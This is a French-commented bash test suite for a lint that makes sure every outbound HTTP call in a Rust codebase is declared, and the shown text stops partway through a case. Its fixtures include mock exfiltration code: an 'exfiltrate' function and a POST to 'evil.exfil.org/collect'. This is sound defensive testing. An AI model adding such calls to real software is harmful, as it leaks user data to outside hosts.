#!/bin/bash
# Test suite pour scripts/verify-egress-manifest.sh (mika#2408).
#
# Une garde qu'on n'a jamais vue échouer n'est pas une garde. Cette suite pinne
# le comportement NÉGATIF du lint dans les QUATRE directions, plus les contrôles
# qui séparent « le lint détecte » de « le lint rougit sur tout ».
#
# Le lint prend une racine de scan en argument (la CI n'en passe aucun et scanne
# l'arbre réel). Chaque cas SYNTHÉTISE une arborescence minimale — jamais une
# copie de l'arbre vivant, jamais un état tiré de l'historique git : la propriété
# testée est un énoncé sur la FORME du code, pas sur l'endroit où une ref se
# trouve (leçon mika#2039 — une anti-vacuité qui lit l'état cassé dans
# l'historique s'inverse le jour où la branche merge).
#
# Lancer : bash scripts/test-verify-egress-manifest.sh
# Attendu : toutes les assertions passent, exit 0.

set -uo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
LINT="$REPO_ROOT/scripts/verify-egress-manifest.sh"
ENGINE="$REPO_ROOT/scripts/lib/egress_manifest_lint.py"
NOLOG_LINT="$REPO_ROOT/scripts/verify-egress-no-log.sh"
EXCEPTIONS="$REPO_ROOT/scripts/egress-manifest-exceptions.tsv"
LIVE_MANIFEST="$REPO_ROOT/docs/egress/egress-manifest.toml"

PASS=0
FAIL=0
TMPROOT=$(mktemp -d "${TMPDIR:-/tmp}/mika2408-lint-XXXXXX")
trap 'rm -rf "$TMPROOT"' EXIT

# Lance le lint sur (racine, manifeste) ; rend "<exit>|<sortie combinée>".
run_lint() {
    local root="$1" manifest="${2:-}" out rc=0
    if [ -n "$manifest" ]; then
        out=$(bash "$LINT" "$root" "$manifest" 2>&1) || rc=$?
    else
        out=$(bash "$LINT" "$root" 2>&1) || rc=$?
    fi
    printf '%s|%s' "$rc" "$out"
}

assert_exit() {
    local label="$1" expected="$2" result="$3"
    local actual="${result%%|*}"
    if [ "$expected" = "$actual" ]; then
        PASS=$((PASS + 1)); echo "  ok $label"
    else
        FAIL=$((FAIL + 1)); echo "  XX $label"
        echo "    exit attendu: $expected"
        echo "    exit réel:    $actual"
        echo "    sortie: ${result#*|}"
    fi
}

assert_true() {
    local label="$1" ok="$2" detail="${3:-}"
    if [ "$ok" = "1" ]; then
        PASS=$((PASS + 1)); echo "  ok $label"
    else
        FAIL=$((FAIL + 1)); echo "  XX $label"
        [ -n "$detail" ] && echo "    $detail"
    fi
}

assert_mentions() {
    local label="$1" needle="$2" result="$3"
    # Herestring, PAS `printf … | grep -q` : sous `pipefail` la forme avec pipe
    # est un piège SIGPIPE (grep -q sort au premier match, printf prend 141,
    # pipefail le promeut, et une aiguille PRÉSENTE se lit comme absente).
    if grep -q -- "$needle" <<< "${result#*|}"; then
        PASS=$((PASS + 1)); echo "  ok $label"
    else
        FAIL=$((FAIL + 1)); echo "  XX $label -- la sortie ne mentionne pas '$needle'"
        echo "    sortie: ${result#*|}"
    fi
}

# --------------------------------------------------------------------------
# Fixtures synthétiques
# --------------------------------------------------------------------------

# Construit une racine minimale : un crate, un fichier de production portant un
# client HTTP et un host, et un manifeste qui les déclare tous deux. C'est la
# BASE SAINE dont chaque cas ne mute qu'un seul point.
fixture_root() {
    local name="$1"
    local root="$TMPROOT/$name"
    mkdir -p "$root/crates/demo/src" "$root/docs/egress"

    cat > "$root/crates/demo/src/upstream.rs" <<'RS'
//! Fixture de production : un client, un host.

pub async fn call() -> Result<String, reqwest::Error> {
    let client = reqwest::Client::new();
    let body = client
        .get("https://declared.upstream.test.invalid/v1/ping")
        .send()
        .await?
        .text()
        .await?;
    Ok(body)
}
RS

    cat > "$root/docs/egress/egress-manifest.toml" <<'TOML'
schema_version = 1

[[sink]]
id                 = "demo-upstream"
destination        = "declared.upstream.example.org"
destination_source = "literal"
class              = "external"
data               = "un ping sans corps"
logged             = false
client_site        = "crates/demo/src/upstream.rs"
call_site          = "crates/demo/src/upstream.rs"
owner              = "@samidarko"
TOML

    printf '%s' "$root"
}

# La fixture de base utilise `.test.invalid` (classe non-sink) dans l'URL pour
# que le contrôle positif N0' passe sans déclarer un host de plus ; mais alors
# D4 réclamerait le littéral de `declared.upstream.example.org`. On le pose dans
# un tableau de hosts, comme le fait `egress_fetch`.
fixture_root_declared_host() {
    local root
    root=$(fixture_root "$1")
    cat >> "$root/crates/demo/src/upstream.rs" <<'RS'

pub const ALLOWED_HOSTS: &[&str] = &["declared.upstream.example.org"];
RS
    printf '%s' "$root"
}

manifest_of() { printf '%s/docs/egress/egress-manifest.toml' "$1"; }

# ============================================================================
echo ""
echo "N0 — l'arbre RÉEL et le manifeste RÉEL sont propres (contrôle positif)"
echo "------------------------------------------------------------------------"
# Sans ce cas, « le lint détecte » est indiscernable de « le lint rougit sur
# tout ». C'est aussi la sonde S1 exécutée en CI plutôt que laissée à un humain.
R=$(run_lint "$REPO_ROOT")
assert_exit "N0 arbre réel + manifeste réel: exit 0" "0" "$R"

R=$(printf '%s|%s' 0 "$(bash "$LINT" --report "$REPO_ROOT" 2>&1)")
assert_mentions "N0 --report annonce l'inventaire (anti-vacuité de S1)" "entrée(s) \[\[sink\]\] confrontée(s)" "$R"

# ============================================================================
echo ""
echo "N0' — la fixture synthétique saine est propre"
echo "-----------------------------------------------"
D=$(fixture_root_declared_host "n0-clean")
assert_exit "N0' fixture saine: exit 0" "0" "$(run_lint "$D" "$(manifest_of "$D")")"

# ============================================================================
echo ""
echo "N1 — D1 : un client HTTP neuf sans entrée manifeste (AC1)"
echo "-----------------------------------------------------------"
# LE DÉFAUT FONDATEUR. Avant mika#2408, ajouter un appel vers un host neuf ne
# faisait tirer aucune porte : les lints egress existants n'enforcent que les
# propriétés d'un sink DÉJÀ décidé.
D=$(fixture_root_declared_host "n1-undeclared-client")
cat > "$D/crates/demo/src/sneaky.rs" <<'RS'
pub async fn exfiltrate() {
    let _client = reqwest::Client::new();
}
RS
R=$(run_lint "$D" "$(manifest_of "$D")")
assert_exit "N1 client non déclaré: exit 1" "1" "$R"
assert_mentions "N1 nomme la direction D1" "egress-manifest, D1" "$R"
assert_mentions "N1 nomme le motif" "undeclared client site" "$R"
assert_mentions "N1 nomme le fichier fautif" "sneaky.rs" "$R"

# ============================================================================
echo ""
echo "N2 — D2 : un host neuf dans un fichier DÉJÀ déclaré (AC1, l'autre moitié)"
echo "--------------------------------------------------------------------------"
# Sans D2, ajouter `client.post("https://evil.example.org/")` dans un fichier
# déjà couvert par un `client_site` ne créerait aucun fichier neuf et passerait.
# C'est le trou qu'un prédicat sur les seules constructions de client laisse
# ouvert.
D=$(fixture_root_declared_host "n2-undeclared-host")
cat >> "$D/crates/demo/src/upstream.rs" <<'RS'

pub async fn also(client: &reqwest::Client) -> Result<(), reqwest::Error> {
    client.post("https://evil.exfil.org/collect").send().await?;
    Ok(())
}
RS
R=$(run_lint "$D" "$(manifest_of "$D")")
assert_exit "N2 host non déclaré dans un fichier déclaré: exit 1" "1" "$R"
assert_mentions "N2 nomme la direction D2" "egress-manifest, D2" "$R"
assert_mentions "N2 nomme le motif" "undeclared destination" "$R"
assert_mentions "N2 nomme le host fautif" "evil.exfil.org" "$R"

# ============================================================================
echo ""
echo "N3 — D3 : une entrée dont le client_site ne couvre aucun sink (AC1b)"
echo "---------------------------------------------------------------------"
D=$(fixture_root_declared_host "n3-phantom-client-site")
cat >> "$(manifest_of "$D")" <<'TOML'

[[sink]]
id                 = "phantom"
destination        = "declared.upstream.example.org"
destination_source = "config"
class              = "external"
data               = "rien — cette entrée décrit un sink qui n'existe pas"
logged             = false
client_site        = "crates/demo/src/does_not_exist.rs"
call_site          = "crates/demo/src/does_not_exist.rs"
owner              = "@samidarko"
TOML
R=$(run_lint "$D" "$(manifest_of "$D")")
assert_exit "N3 client_site fantôme: exit 1" "1" "$R"
assert_mentions "N3 nomme la direction D3" "egress-manifest, D3" "$R"
assert_mentions "N3 nomme le motif" "phantom client_site" "$R"
assert_mentions "N3 nomme l'entrée fautive" "phantom" "$R"

# ============================================================================
echo ""
echo "N4 — D4 : une destination 'literal' qui n'apparaît nulle part (AC1b)"
echo "----------------------------------------------------------------------"
D=$(fixture_root_declared_host "n4-phantom-destination")
cat >> "$(manifest_of "$D")" <<'TOML'

[[sink]]
id                 = "phantom-host"
destination        = "never.mentioned.example.org"
destination_source = "literal"
class              = "external"
data               = "rien — ce host n'est dans aucun littéral"
logged             = false
client_site        = "crates/demo/src/upstream.rs"
call_site          = "crates/demo/src/upstream.rs"
owner              = "@samidarko"
TOML
R=$(run_lint "$D" "$(manifest_of "$D")")
assert_exit "N4 destination littérale fantôme: exit 1" "1" "$R"
assert_mentions "N4 nomme la direction D4" "egress-manifest, D4" "$R"
assert_mentions "N4 nomme le motif" "phantom destination" "$R"
assert_mentions "N4 nomme le host fautif" "never.mentioned.example.org" "$R"

# ============================================================================
echo ""
echo "N5 — CONTRÔLE NÉGATIF : la même mutation que N1, sous #[cfg(test)] (AC4)"
echo "-------------------------------------------------------------------------"
# Cas PORTEUR, pas de la décoration : sans lui, « le lint détecte » est
# indiscernable de « le lint rougit sur tout ». C'est aussi la mesure R1 du
# plan — `orchestrator_inbox.rs:524` est du code de test, et un détecteur qui
# grep sans découper le test rapporte des sinks qui n'existent pas.
D=$(fixture_root_declared_host "n5-cfg-test")
cat >> "$D/crates/demo/src/upstream.rs" <<'RS'

#[cfg(test)]
mod tests {
    #[tokio::test]
    async fn harness() {
        let _client = reqwest::Client::new();
        let _url = "https://only-in-tests.exfil.org/collect";
    }
}
RS
assert_exit "N5 client + host en #[cfg(test)] mod: exit 0" "0" "$(run_lint "$D" "$(manifest_of "$D")")"

# ============================================================================
echo ""
echo "N6 — CONTRÔLE NÉGATIF : la même mutation sous crates/*/tests/ (AC4)"
echo "--------------------------------------------------------------------"
D=$(fixture_root_declared_host "n6-tests-dir")
mkdir -p "$D/crates/demo/tests"
cat > "$D/crates/demo/tests/integration.rs" <<'RS'
#[tokio::test]
async fn integration() {
    let _client = reqwest::Client::new();
    let _url = "https://only-in-integration.exfil.org/collect";
}
RS
assert_exit "N6 client + host sous tests/: exit 0" "0" "$(run_lint "$D" "$(manifest_of "$D")")"

# ============================================================================
echo ""
echo "N6b — CONTRÔLE NÉGATIF : un module désigné par #[cfg(test)] mod NAME;"
echo "-----------------------------------------------------------------------"
# Le cas mesuré sur l'arbre réel : `egress_search/tests_e4_no_log.rs` est un
# fichier ENTIÈREMENT de test, mais il ne peut pas le dire depuis son propre
# contenu — c'est son déclarant qui le dit. Sans la résolution des
# `#[cfg(test)] mod NAME;`, son host de fixture rougit en D2.
D=$(fixture_root_declared_host "n6b-external-test-mod")
cat >> "$D/crates/demo/src/upstream.rs" <<'RS'

#[cfg(test)]
mod tests_fixtures;
RS
mkdir -p "$D/crates/demo/src/upstream"
cat > "$D/crates/demo/src/upstream/tests_fixtures.rs" <<'RS'
#[tokio::test]
async fn fixture() {
    let _client = reqwest::Client::new();
    let _url = "https://only-in-fixtures.exfil.org/collect";
}
RS
assert_exit "N6b module de test déclaré en externe: exit 0" "0" "$(run_lint "$D" "$(manifest_of "$D")")"

# ============================================================================
echo ""
echo "N7 — le manifeste au TOML invalide ne rend JAMAIS un vert"
echo "-----------------------------------------------------------"
D=$(fixture_root_declared_host "n7-bad-toml")
printf '[[sink]\nid = "cassé"\n' > "$(manifest_of "$D")"
R=$(run_lint "$D" "$(manifest_of "$D")")
assert_exit "N7 TOML invalide: exit 2" "2" "$R"
assert_mentions "N7 nomme le défaut de parsing" "TOML invalide" "$R"

# ============================================================================
echo ""
echo "N7b — un manifeste absent ne rend JAMAIS un vert"
echo "--------------------------------------------------"
D=$(fixture_root_declared_host "n7b-missing")
rm -f "$(manifest_of "$D")"
R=$(run_lint "$D" "$(manifest_of "$D")")
assert_exit "N7b manifeste absent: exit 2" "2" "$R"
assert_mentions "N7b nomme la classe mika#2205" "mika#2205" "$R"

# ============================================================================
echo ""
echo "N7c — un champ obligatoire manquant ne rend JAMAIS un vert"
echo "------------------------------------------------------------"
D=$(fixture_root_declared_host "n7c-missing-field")
cat > "$(manifest_of "$D")" <<'TOML'
schema_version = 1

[[sink]]
id          = "sans-data"
destination = "declared.upstream.example.org"
destination_source = "literal"
class       = "external"
logged      = false
client_site = "crates/demo/src/upstream.rs"
call_site   = "crates/demo/src/upstream.rs"
owner       = "@samidarko"
TOML
R=$(run_lint "$D" "$(manifest_of "$D")")
assert_exit "N7c champ 'data' manquant: exit 2" "2" "$R"
assert_mentions "N7c nomme le champ manquant" "data" "$R"

# ============================================================================
echo ""
echo "N8 — ANTI-VACUITÉ : un manifeste sans aucune entrée est REFUSÉ"
echo "----------------------------------------------------------------"
# Elle interdit qu'un futur refactor rende le lint silencieusement inerte, ce
# qui se lit exactement comme un arbre propre (classe mika#2205). Un manifeste
# vide ferait passer D3 et D4 trivialement.
D=$(fixture_root_declared_host "n8-empty-manifest")
printf 'schema_version = 1\n' > "$(manifest_of "$D")"
R=$(run_lint "$D" "$(manifest_of "$D")")
assert_exit "N8 manifeste sans [[sink]]: exit 2" "2" "$R"
assert_mentions "N8 nomme l'anti-vacuité" "Anti-vacuité" "$R"

# Les DEUX formes vides, et la seconde n'est pas de la décoration : `sink`
# absent rend `None`, `sink = []` rend une liste vide, et un prédicat écrit
# `not isinstance(sinks, list)` attraperait la première et laisserait passer la
# seconde. Mesuré : la première mutation de vérification de ce cas est tombée
# dans ce trou.
D=$(fixture_root_declared_host "n8c-empty-array")
printf 'schema_version = 1\nsink = []\n' > "$(manifest_of "$D")"
R=$(run_lint "$D" "$(manifest_of "$D")")
assert_exit "N8c tableau \`sink\` vide: exit 2" "2" "$R"
assert_mentions "N8c nomme l'anti-vacuité" "Anti-vacuité" "$R"

# ============================================================================
echo ""
echo "N8b — ANTI-VACUITÉ : un inventaire vide est REFUSÉ, jamais un vert"
echo "--------------------------------------------------------------------"
# Le pendant code de N8, et la Halte 1 de la sonde S1 : un lint qui ne regarde
# plus rien (répertoire renommé, extension changée) doit refuser de lui-même.
D=$(fixture_root_declared_host "n8b-empty-inventory")
rm -rf "$D/crates"
R=$(run_lint "$D" "$(manifest_of "$D")")
assert_exit "N8b aucun .rs scanné: exit 2" "2" "$R"
assert_mentions "N8b dit qu'il ne regarde rien" "ne regarde rien" "$R"

# ============================================================================
echo ""
echo "N9 — CONTRÔLE NÉGATIF : D4 ne s'applique pas à 'config'"
echo "---------------------------------------------------------"
# Une destination `config` ou `skill-declared` n'est par construction dans aucun
# littéral. Exiger le contraire ferait rougir le lint sur les déclarations les
# plus HONNÊTES du fichier — celles qui disent que la destination est
# repointable à l'exécution.
D=$(fixture_root_declared_host "n9-config-source")
cat >> "$(manifest_of "$D")" <<'TOML'

[[sink]]
id                 = "repointable"
destination        = "MIKA_DEMO_BASE_URL (aucun défaut)"
destination_source = "config"
class              = "external"
data               = "ce que l'appelant compose"
logged             = false
client_site        = "crates/demo/src/upstream.rs"
call_site          = "crates/demo/src/upstream.rs"
owner              = "@samidarko"
TOML
assert_exit "N9 destination 'config' sans littéral: exit 0" "0" "$(run_lint "$D" "$(manifest_of "$D")")"

D=$(fixture_root_declared_host "n9b-skill-declared")
cat >> "$(manifest_of "$D")" <<'TOML'

[[sink]]
id                 = "arbitraire"
destination        = "déclarée par le manifeste de la skill"
destination_source = "skill-declared"
class              = "external"
data               = "l'entrée JSON de l'outil"
logged             = false
client_site        = "crates/demo/src/upstream.rs"
call_site          = "crates/demo/src/upstream.rs"
owner              = "@samidarko"
TOML
assert_exit "N9b destination 'skill-declared' sans littéral: exit 0" "0" "$(run_lint "$D" "$(manifest_of "$D")")"

# ============================================================================
echo ""
echo "N9c — CONTRÔLE NÉGATIF : les classes NON_SINK ne rougissent pas (AC4)"
echo "-----------------------------------------------------------------------"
# `localhost`, `127.0.0.0/8`, RFC 2606, `*.invalid`, `*.test`,
# `*.svc.cluster.local` : chacune porte sa raison dans le moteur. Sans ce cas,
# une classe retirée par mégarde ferait rougir tout l'arbre et la garde serait
# désarmée plutôt que corrigée.
D=$(fixture_root_declared_host "n9c-non-sink-classes")
cat >> "$D/crates/demo/src/upstream.rs" <<'RS'

pub fn internal_targets() -> Vec<String> {
    vec![
        "http://localhost:8080/health".to_string(),
        "http://127.0.0.1:3001/send".to_string(),
        "http://127.16.0.9:9000/probe".to_string(),
        "https://example.com/doc".to_string(),
        "https://example.org/doc".to_string(),
        "https://example.net/doc".to_string(),
        "https://nothing.invalid/x".to_string(),
        "https://fixture.test/x".to_string(),
        "https://printer.local/x".to_string(),
        format!("http://mika-{}.{}.svc.cluster.local:8080", "c", "ns"),
    ]
}
RS
assert_exit "N9c dix classes non-sink: exit 0" "0" "$(run_lint "$D" "$(manifest_of "$D")")"

# ============================================================================
echo ""
echo "N9d — CONTRÔLE NÉGATIF : les formes réelles qui ont cassé le prédicat"
echo "-----------------------------------------------------------------------"
# Quatre formes mesurées sur l'arbre. Chacune produisait un host FAUX avant
# d'être modélisée, et chacune aurait rougi en D2 sur un arbre sain — le faux
# positif qu'AC4 interdit. Ce cas rougit le jour où l'une des quatre est
# « simplifiée » hors du motif.
D=$(fixture_root_declared_host "n9d-parser-shapes")
cat >> "$D/crates/demo/src/upstream.rs" <<'RS'

pub fn measured_shapes(token: &str) -> Vec<String> {
    vec![
        // userinfo — sans le saut, le host capté est `x-access-token`
        format!("https://x-access-token:{token}@declared.upstream.example.org/x"),
        // point échappé de regex — sans `\` dans la classe, le host est `declared`
        r"https://declared\.upstream\.example\.org/y".to_string(),
        // port — sans exclusion, le host porte `:8443`
        "https://declared.upstream.example.org:8443/z".to_string(),
    ]
}
RS
assert_exit "N9d userinfo + regex + port: exit 0" "0" "$(run_lint "$D" "$(manifest_of "$D")")"

# ============================================================================
echo ""
echo "N10 — FRONTIÈRE : le lint ne touche pas la garde STRIP-TOTAL"
echo "--------------------------------------------------------------"
# La séparation des deux parseurs `#[cfg(test)]` est une DÉCISION, pas une
# intention (plan mika#2408 § M2). Deux mesures l'imposent :
#   (i)  le parseur de verify-egress-no-log.sh refuse en fail-closed deux formes
#        présentes dans la population visée ici (`#[cfg(test)]` sur une `fn` nue
#        dans llm/ollama.rs, sur une `const` nue dans gateway/routes.rs) ;
#   (ii) l'EXTRAIRE vers un fichier partagé fait rougir son propre test — la V13
#        de test-verify-egress-no-log.sh cherche la définition DANS CE
#        FICHIER-LÀ, par ancrage de début de ligne.
# Et le DUPLIQUER crée une divergence que V13 ne peut pas voir depuis son côté,
# parce qu'elle est scopée à un seul fichier : le pire des trois cas.
#
# Allowlist livrée VIDE. Quand ce scan tire, on retire l'emprunt — on
# n'allowliste pas (doctrine mika#2201).
NOLOG_BORROW_ALLOWED=()

borrowed=""
for needle in 'AWK_SANITIZE_FN' 'function sanitize(' 'production_lines' 'macro_block'; do
    skip=0
    for ex in ${NOLOG_BORROW_ALLOWED+"${NOLOG_BORROW_ALLOWED[@]}"}; do
        [ "$ex" = "$needle" ] && skip=1
    done
    [ "$skip" = "1" ] && continue
    if grep -q -F -- "$needle" "$ENGINE" 2>/dev/null; then
        borrowed="$borrowed $needle"
    fi
done
assert_true "N10 le moteur n'emprunte rien au parseur STRIP-TOTAL" \
    "$([ -z "$borrowed" ] && echo 1 || echo 0)" \
    "symboles empruntés à verify-egress-no-log.sh:$borrowed"

if grep -q -F -- 'verify-egress-no-log.sh' "$LINT" 2>/dev/null; then
    sourced=$(grep -c -E '^\s*(\.|source)\s' "$LINT")
else
    sourced=0
fi
assert_true "N10 le lint ne source pas verify-egress-no-log.sh" \
    "$([ "$sourced" -eq 0 ] && echo 1 || echo 0)" \
    "$sourced ligne(s) de sourcing trouvée(s) dans $LINT"

# ANTI-VACUITÉ du scan lui-même : si les quatre aiguilles cessaient d'exister
# dans la garde voisine, le scan ci-dessus passerait en ne regardant rien —
# exactement la classe mika#2205, appliquée au test qui la prêche.
present=0
for needle in 'AWK_SANITIZE_FN' 'function sanitize(' 'production_lines' 'macro_block'; do
    grep -q -F -- "$needle" "$NOLOG_LINT" && present=$((present + 1))
done
assert_true "N10 anti-vacuité — les 4 aiguilles existent bien dans la garde voisine" \
    "$([ "$present" -eq 4 ] && echo 1 || echo 0)" \
    "$present/4 aiguilles trouvées dans $NOLOG_LINT ; le scan ci-dessus ne prouverait rien"

# Et la garde voisine reste INTOUCHÉE : sa V13 doit continuer de passer.
nolog_rc=0
bash "$REPO_ROOT/scripts/test-verify-egress-no-log.sh" >/dev/null 2>&1 || nolog_rc=$?
assert_true "N10 test-verify-egress-no-log.sh passe toujours" \
    "$([ "$nolog_rc" -eq 0 ] && echo 1 || echo 0)" \
    "test-verify-egress-no-log.sh a rendu $nolog_rc"

# ============================================================================
echo ""
echo "N11 — l'allowlist d'exceptions est VIDE, et ses entrées ne rancissent pas"
echo "--------------------------------------------------------------------------"
# PIN-VIDE. Quand elle tire, on lit la ligne qu'on vient d'ajouter et on se
# demande pourquoi ce sink ne peut pas se déclarer (Fire-Disposition (a) du plan,
# doctrine mika#2201). Modèle : canonical_tokens, check-pilot-push-sites.sh.
assert_true "N11 le fichier d'exceptions existe" \
    "$([ -f "$EXCEPTIONS" ] && echo 1 || echo 0)" \
    "attendu à $EXCEPTIONS"

data_lines=$(grep -c -v -E '^\s*(#|$)' "$EXCEPTIONS" 2>/dev/null || true)
assert_true "N11 PIN-VIDE — zéro ligne de données" \
    "$([ "${data_lines:-0}" -eq 0 ] && echo 1 || echo 0)" \
    "$data_lines entrée(s) trouvée(s) ; un détecteur livré avec cinq exceptions est un détecteur dont personne ne lira la sixième"

# AUTO-NETTOYANTE — chaque entrée doit encore correspondre à une violation
# réelle. Inerte tant que le fichier est vide, ce qui est le cas nominal ; elle
# rougit LE JOUR DE LA RÉPARATION, pas des mois après.
stale=""
while IFS=$'\t' read -r path direction _ticket _reason; do
    case "$path" in ''|'#'*) continue ;; esac
    R_STALE=$(run_lint "$REPO_ROOT")
    if ! grep -q -- "$path" <<< "${R_STALE#*|}"; then
        stale="$stale $path($direction)"
    fi
done < "$EXCEPTIONS"
assert_true "N11 AUTO-NETTOYANTE — aucune exception stale" \
    "$([ -z "$stale" ] && echo 1 || echo 0)" \
    "exceptions ne correspondant plus à aucune violation:$stale"

# ============================================================================
echo ""
echo "N12 — le manifeste vivant est complet sur les sinks nommés par AC2"
echo "--------------------------------------------------------------------"
# AC2 énumère les familles à back-filler. Ce cas les pinne par nom : un
# retrait silencieux d'une entrée ferait rougir ici en plus de D1.
for needle in \
    'crates/mika-gateway/src/egress_search/mod.rs' \
    'crates/mika-gateway/src/egress_fetch/mod.rs' \
    'crates/mika-gateway/src/telegram.rs' \
    'crates/mika-common/src/llm/openai.rs' \
    'crates/mika-common/src/llm/ollama.rs' \
    'crates/mika-agent/src/github_graphql.rs' \
    'crates/mika-common/src/oauth.rs'
do
    if grep -q -F -- "$needle" "$LIVE_MANIFEST"; then
        PASS=$((PASS + 1)); echo "  ok N12 AC2 couvre $needle"
    else
        FAIL=$((FAIL + 1)); echo "  XX N12 AC2 ne couvre pas $needle"
    fi
done

# ============================================================================
echo ""
echo "N12b — orchestrator_inbox.rs est un NON-SINK mesuré, et le reste"
echo "------------------------------------------------------------------"
# L'AC2 le nomme ; la MESURE le réfute. Ses trois seules mentions de `reqwest`
# (:524, :526, :537) sont toutes après le `#[cfg(test)]` de la ligne 495, et
# aucune fonction de production n'émet de requête — c'est une surface ENTRANTE
# (POST + SSE) adossée à Postgres.
#
# Lui donner une entrée [[sink]] pour satisfaire la lettre de l'AC écrirait un
# chemin d'egress QUI N'EXISTE PAS, et le lockstep la laisserait passer (son
# `client_site` pointerait main.rs, où un vrai client est construit) : la
# fausseté serait SILENCIEUSE. Ce cas tient les deux sens.
INBOX="crates/mika-gateway/src/orchestrator_inbox.rs"

# (1) Il ne doit PAS apparaître comme `client_site` du manifeste.
declared_as_client=$(grep -E '^\s*client_site' "$LIVE_MANIFEST" | grep -c -F -- "$INBOX" || true)
assert_true "N12b orchestrator_inbox.rs n'est déclaré comme client_site d'aucun sink" \
    "$([ "${declared_as_client:-0}" -eq 0 ] && echo 1 || echo 0)" \
    "trouvé $declared_as_client fois ; ce module n'émet aucune requête en production — voir docs/egress/README.md"

# (2) La mesure doit rester ÉCRITE, sinon un futur lecteur la refera et
#     conclura à un oubli de back-fill.
assert_true "N12b la mesure est documentée dans docs/egress/README.md" \
    "$(grep -q -F -- "$INBOX" "$REPO_ROOT/docs/egress/README.md" && echo 1 || echo 0)" \
    "le README doit expliquer POURQUOI ce module cité par l'AC2 n'a pas d'entrée"

# (3) ANTI-VACUITÉ de (1) : la mesure doit rester VRAIE de l'arbre. Le jour où
#     ce module gagne un vrai client de production, D1 le réclamera au
#     manifeste et cette assertion doit rougir pour qu'on relise le README
#     plutôt que de le contredire en silence.
prod_reqwest=$(sed -n '1,494p' "$REPO_ROOT/$INBOX" | grep -c 'reqwest::Client' || true)
assert_true "N12b anti-vacuité — aucun client reqwest avant le #[cfg(test)]" \
    "$([ "${prod_reqwest:-0}" -eq 0 ] && echo 1 || echo 0)" \
    "$prod_reqwest construction(s) de client en production ; la mesure du README est périmée, le module est devenu un sink"

# ============================================================================
echo ""
echo "N13 — verify-egress-uniqueness.sh reste vert avec le manifeste en place"
echo "-------------------------------------------------------------------------"
# M4b du plan : le manifeste nomme par définition les hosts que ce lint confine,
# donc son premier commit le fait rougir tant que `docs/egress/` n'est pas dans
# AUTHORIZED_PATHS. Ce n'est pas un effet de bord, c'est une propriété du
# livrable — et elle se pinne.
uniq_rc=0
uniq_out=$(bash "$REPO_ROOT/scripts/verify-egress-uniqueness.sh" 2>&1) || uniq_rc=$?
assert_true "N13 egress-uniqueness vert (docs/egress/ dans AUTHORIZED_PATHS)" \
    "$([ "$uniq_rc" -eq 0 ] && echo 1 || echo 0)" \
    "verify-egress-uniqueness.sh a rendu $uniq_rc : $uniq_out"

# ============================================================================
echo ""
echo "N14 — AC5 : une seule liste de hosts, et elle est celle du manifeste"
echo "----------------------------------------------------------------------"
# La liste vivait en dur dans verify-egress-uniqueness.sh, maintenue à la main,
# et rien ne forçait son entrée : un nouvel upstream absent de la liste passait
# en silence. Elle est désormais dérivée. Ce cas tient les trois moitiés :
# la dérivation produit quelque chose, elle produit LES BONS hosts, et la
# liste en dur a bien disparu.
derived=$(python3 -B "$ENGINE" --confined-hosts "$REPO_ROOT" 2>/dev/null)
derived_count=$(printf '%s\n' "$derived" | grep -c . || true)
assert_true "N14 la dérivation rend des hosts (anti-vacuité)" \
    "$([ "${derived_count:-0}" -ge 1 ] && echo 1 || echo 0)" \
    "$derived_count host(s) dérivé(s) ; une garde de confinement sans pattern se lit comme une garde qui passe"

# Les cinq hosts historiquement confinés (mika#1807 + mika#1969) doivent
# survivre à la bascule. Ils sont DÉSIGNÉS par leur entrée de manifeste plutôt
# qu'épelés ici : ce fichier n'est pas dans AUTHORIZED_PATHS, et l'y ajouter
# pour un test serait du bruit permanent sur une garde de sûreté.
for sink_id in "brave-search" "gouv-fr-fetch"; do
    if grep -q -F -- "id                 = \"$sink_id\"" "$LIVE_MANIFEST"; then
        PASS=$((PASS + 1)); echo "  ok N14 le sink confiné '$sink_id' est au manifeste"
    else
        FAIL=$((FAIL + 1)); echo "  XX N14 le sink confiné '$sink_id' a disparu du manifeste"
    fi
done
assert_true "N14 les 5 hosts confinés historiques sont tous dérivés" \
    "$([ "${derived_count:-0}" -eq 5 ] && echo 1 || echo 0)" \
    "$derived_count dérivé(s), 5 attendus (1 Brave + 4 gouv.fr) ; un rétrécissement silencieux désarme le confinement"

# La liste en dur a disparu, et le prédicat est POSITIONNEL plutôt que par
# plage. Un premier jet prenait la plage `sed -n '/^PATTERNS=(/,/^)/p'` et
# capturait AUTHORIZED_PATHS en entier — 22 faux positifs, parce que
# `PATTERNS=()` se ferme sur sa propre ligne et que la plage courait jusqu'au
# `)` du tableau suivant. Deux prédicats étroits, chacun sur une forme de
# réintroduction distincte :
UNIQ="$REPO_ROOT/scripts/verify-egress-uniqueness.sh"

#   (a) une ligne `PATTERNS` portant un littéral entre guillemets — la forme
#       `PATTERNS+=("evil.com")`. `PATTERNS+=("$host")` passe : c'est une
#       expansion, pas un littéral.
literal_on_patterns=$(grep -cE '^[[:space:]]*PATTERNS(\+)?=.*"[^$]' "$UNIQ" || true)
assert_true "N14 aucune ligne PATTERNS ne porte un host littéral" \
    "$([ "${literal_on_patterns:-0}" -eq 0 ] && echo 1 || echo 0)" \
    "$literal_on_patterns ligne(s) ; AC5 exige une source unique"

#   (b) le tableau n'est jamais ouvert en multi-ligne — la forme historique
#       `PATTERNS=(` suivi d'une liste. C'est celle qui vivait ici.
multiline_open=$(grep -cE '^[[:space:]]*PATTERNS(\+)?=\([[:space:]]*$' "$UNIQ" || true)
assert_true "N14 le tableau PATTERNS n'est jamais ouvert en multi-ligne" \
    "$([ "${multiline_open:-0}" -eq 0 ] && echo 1 || echo 0)" \
    "$multiline_open ouverture(s) ; c'est la forme de la liste que AC5 retire"

#   (c) ANTI-VACUITÉ de (a) et (b) : ils ne prouvent rien si le script a cessé
#       de parler de PATTERNS. Il doit encore le peupler depuis la dérivation.
derives=$(grep -cE 'PATTERNS\+=\("\$host"\)' "$UNIQ" || true)
assert_true "N14 anti-vacuité — le script peuple bien PATTERNS depuis la dérivation" \
    "$([ "${derives:-0}" -ge 1 ] && echo 1 || echo 0)" \
    "aucune ligne de peuplement trouvée ; (a) et (b) regarderaient un script qui n'a plus de PATTERNS du tout"

#   (d) FAIL-CLOSED de la dérivation. C'est le terme qui décide : un manifeste
#       sans aucune entrée `confined = true` doit REFUSER, jamais rendre une
#       liste vide avec exit 0 — une garde de confinement sans pattern se lit
#       exactement comme une garde qui passe.
D=$(fixture_root_declared_host "n14d-no-confined")
rc=0
